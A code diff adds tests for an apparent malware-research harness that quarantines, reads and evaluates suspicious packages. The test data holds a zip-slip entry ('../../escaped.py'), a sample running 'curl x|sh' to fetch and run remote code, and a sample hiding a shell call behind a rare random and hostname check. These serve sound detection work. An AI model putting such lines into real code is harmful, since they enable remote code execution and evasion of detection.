@@ -1054,6 +1054,124 @@ def test_client_uploads_every_manifest_the_backend_can_read():
         assert base in src, f"{base} is a manifest the backend reads but the client drops"
 
 
+# --- research harness ------------------------------------------------------ #
+def _repo_root():
+    """`research/` lives beside sinkline/, but pytest runs from inside sinkline/."""
+    import os, sys
+    root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
+    if root not in sys.path:
+        sys.path.insert(0, root)
+    return root
+
+
+def test_quarantine_refuses_to_extract_outside_root():
+    """A zip with ../ entries must not escape the quarantine directory."""
+    _repo_root()
+    import pathlib, tempfile, zipfile
+    from research.quarantine import UnsafeOperation, extract_sample
+    with tempfile.TemporaryDirectory() as d:
+        zp = pathlib.Path(d) / "evil.zip"
+        with zipfile.ZipFile(zp, "w") as zf:
+            zf.writestr("../../escaped.py", "import os\n")
+        try:
+            extract_sample(zp, pathlib.Path(d) / "out")
+            assert False, "path traversal was not rejected"
+        except UnsafeOperation:
+            pass
+
+
+def test_read_python_files_returns_source_without_importing():
+    _repo_root()
+    import pathlib, tempfile
+    from research.quarantine import read_python_files
+    with tempfile.TemporaryDirectory() as d:
+        root = pathlib.Path(d)
+        (root / "setup.py").write_text("raise SystemExit('should never run')\n")
+        files = read_python_files(root)
+        assert "setup.py" in files and "should never run" in files["setup.py"]
+
+
+def test_quarantine_directories_are_gitignored():
+    import pathlib
+    root = pathlib.Path(_repo_root())
+    ignored = (root / ".gitignore").read_text(encoding="utf-8")
+    assert "research/quarantine/" in ignored and "research/corpora/" in ignored
+
+
+def test_corpus_loads_samples_from_datadog_layout():
+    _repo_root()
+    import pathlib
+    from research.corpus import load_datadog
+    root = pathlib.Path(_repo_root()) / "research" / "fixtures"
+    samples = list(load_datadog(root))
+    assert samples, "no samples loaded from the fixture corpus"
+    s = samples[0]
+    assert s.name == "demo_pkg" and s.label == "malicious_intent"
+    assert any(p.endswith(".py") for p in s.files)
+
+
+def test_corpus_limit_is_respected():
+    _repo_root()
+    import pathlib
+    from research.corpus import load_datadog
+    root = pathlib.Path(_repo_root()) / "research" / "fixtures"
+    assert len(list(load_datadog(root, limit=0))) == 0
+
+
+def test_baseline_reports_unavailable_rather_than_false_negative():
+    """A missing tool must never be recorded as 'found nothing'."""
+    _repo_root()
+    from research.baselines import run_bandit
+    r = run_bandit({"a.py": "import os\n"}, binary="definitely-not-a-real-binary")
+    assert r.available is False and r.alerted is False
+    assert "not available" in r.detail.lower()
+
+
+def test_method_hash_is_deterministic_and_covers_the_prior_table():
+    _repo_root()
+    from research.freeze import _FROZEN_FILES, method_hash
+    assert method_hash() == method_hash()
+    assert "data/guard_priors.json" in _FROZEN_FILES, (
+        "the prior table changes scores, so it must be inside the freeze")
+    assert "trigger_rarity.py" in _FROZEN_FILES
+
+
+def test_freeze_roundtrip_detects_a_changed_method():
+    _repo_root()
+    import json, pathlib, tempfile
+    from research.freeze import verify_freeze, write_freeze
+    with tempfile.TemporaryDirectory() as d:
+        p = pathlib.Path(d) / "freeze.json"
+        write_freeze(p)
+        ok, detail = verify_freeze(p)
+        assert ok, detail
+        payload = json.loads(p.read_text())
+        payload["method_hash"] = "0" * 64      # stand-in for an edited method
+        p.write_text(json.dumps(payload))
+        ok, detail = verify_freeze(p)
+        assert not ok and "changed" in detail.lower()
+
+
+def test_evaluate_reports_added_detections_and_scope():
+    _repo_root()
+    from research.corpus import Sample
+    from research.evaluate import evaluate
+    samples = [
+        Sample("guarded", "1.0", "malicious_intent", {
+            "m.py": ("import os, random, socket\n"
+                     "if random.random() < 0.005:\n"
+                     "    if socket.gethostname() == 'b':\n"
+                     "        os.system('x')\n")}),
+        Sample("unconditional", "1.0", "malicious_intent", {
+            "m.py": "import os\nos.system('curl x|sh')\n"}),
+    ]
+    report = evaluate(samples, baselines=False)
+    assert report["total"] == 2
+    assert report["trigger_detected"] == 1
+    assert report["unconditional"] == 1
+    assert report["conditional_fraction"] == 0.5
+
+
 # --- standalone runner ----------------------------------------------------- #
 if __name__ == "__main__":
     from unittest import SkipTest
